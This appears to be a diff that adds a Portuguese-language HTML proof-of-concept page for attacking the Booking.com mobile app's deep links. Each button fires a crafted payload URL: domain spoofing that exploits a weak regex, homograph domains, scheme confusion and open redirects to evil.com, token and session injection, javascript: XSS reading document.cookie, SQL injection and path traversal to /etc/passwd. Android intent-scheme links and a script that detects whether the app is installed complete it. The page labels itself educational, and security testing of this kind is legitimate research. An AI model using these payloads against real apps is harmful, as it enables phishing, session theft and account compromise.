@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Booking.com Deep Link Security PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        .test-section {
+            border: 1px solid #ccc;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .test-button {
+            background-color: #003580;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            margin: 5px;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
+        .description {
+            color: #666;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Booking.com Deep Link Security PoC</h1>
+    <p class="warning">⚠️ Este é um Proof of Concept para fins educacionais e de pesquisa apenas.</p>
+
+    <div class="test-section">
+        <h2>1. Teste de Validação de URL</h2>
+        <div class="description">
+            Testa a validação de URLs explorando a expressão regular fraca "^.*\.booking\.(cn|com)$"
+        </div>
+        <button class="test-button" onclick="window.location.href='booking://malicious.booking.com.attacker.com/hotel/123'">
+            Teste Spoofing de Domínio
+        </button>
+        <button class="test-button" onclick="window.location.href='booking://xn--boking-com.com/hotel/123'">
+            Teste Ataque Homógrafo
+        </button>
+    </div>
+
+    <div class="test-section">
+        <h2>2. Teste de Esquema de URL</h2>
+        <div class="description">
+            Explora a transição entre esquemas http/https/booking
+        </div>
+        <button class="test-button" onclick="window.location.href='booking://https://booking.com@evil.com'">
+            Teste Confusão de Esquema
+        </button>
+        <button class="test-button" onclick="window.location.href='https://booking.com@malicious.com/hotel/123'">
+            Teste URL com @
+        </button>
+    </div>
+
+    <div class="test-section">
+        <h2>3. Teste de Manipulação de Sessão</h2>
+        <div class="description">
+            Tenta explorar problemas de gerenciamento de sessão
+        </div>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/myaccount?auth_token=STOLEN_TOKEN'">
+            Injeção de Token
+        </button>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/myreservations?session_id=FAKE_SESSION'">
+            Manipulação de Sessão
+        </button>
+    </div>
+
+    <div class="test-section">
+        <h2>4. Teste de Redirecionamento</h2>
+        <div class="description">
+            Testa vulnerabilidades de redirecionamento aberto
+        </div>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/hotel/123?next=https://evil.com'">
+            Open Redirect
+        </button>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/redirect?url=javascript:alert(1)'">
+            XSS via Redirect
+        </button>
+    </div>
+
+    <div class="test-section">
+        <h2>5. Teste de Injeção de Parâmetros</h2>
+        <div class="description">
+            Testa a sanitização de parâmetros
+        </div>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/hotel/123?id=1%27%20OR%20%271%27=%271'">
+            SQL Injection
+        </button>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/hotel/123?callback=javascript:alert(document.cookie)'">
+            XSS via Parâmetro
+        </button>
+    </div>
+
+    <div class="test-section">
+        <h2>6. Teste de Path Traversal</h2>
+        <div class="description">
+            Testa vulnerabilidades de navegação de diretório
+        </div>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/../../../etc/passwd'">
+            Path Traversal
+        </button>
+        <button class="test-button" onclick="window.location.href='booking://secure.booking.com/images/..%2f..%2f..%2f/etc/passwd'">
+            Path Traversal Encoded
+        </button>
+    </div>
+
+    <div class="test-section">
+        <h2>7. Teste de Intent Filter</h2>
+        <div class="description">
+            Testa a manipulação de intent filters do Android
+        </div>
+        <button class="test-button" onclick="window.location.href='intent://booking.com/hotel/123#Intent;scheme=booking;package=com.booking;end'">
+            Intent Scheme
+        </button>
+        <button class="test-button" onclick="window.location.href='booking://booking.com/hotel/123?intent=malicious'">
+            Intent Parameter
+        </button>
+    </div>
+
+    <div class="test-section">
+        <h2>8. Teste de Universal Links</h2>
+        <div class="description">
+            Testa a implementação de Universal Links
+        </div>
+        <button class="test-button" onclick="window.location.href='https://secure.booking.com/.well-known/apple-app-site-association'">
+            AASA File
+        </button>
+        <button class="test-button" onclick="window.location.href='https://secure.booking.com/universal-link/hotel/123'">
+            Universal Link
+        </button>
+    </div>
+
+    <script>
+        // Função para log de tentativas
+        function logAttempt(description) {
+            console.log(`Tentativa de exploit: ${description} - ${new Date().toISOString()}`);
+        }
+
+        // Adiciona event listeners para todos os botões
+        document.querySelectorAll('.test-button').forEach(button => {
+            button.addEventListener('click', function() {
+                logAttempt(this.textContent.trim());
+            });
+        });
+
+        // Detecta se o app está instalado
+        function checkAppInstalled() {
+            const start = Date.now();
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'booking://';
+            document.body.appendChild(iframe);
+
+            setTimeout(function() {
+                const duration = Date.now() - start;
+                if (duration < 100) {
+                    console.log('App provavelmente não está instalado');
+                } else {
+                    console.log('App provavelmente está instalado');
+                }
+                document.body.removeChild(iframe);
+            }, 100);
+        }
+
+        // Checa ao carregar a página
+        window.onload = checkAppInstalled;
+    </script>
+</body>
+</html>
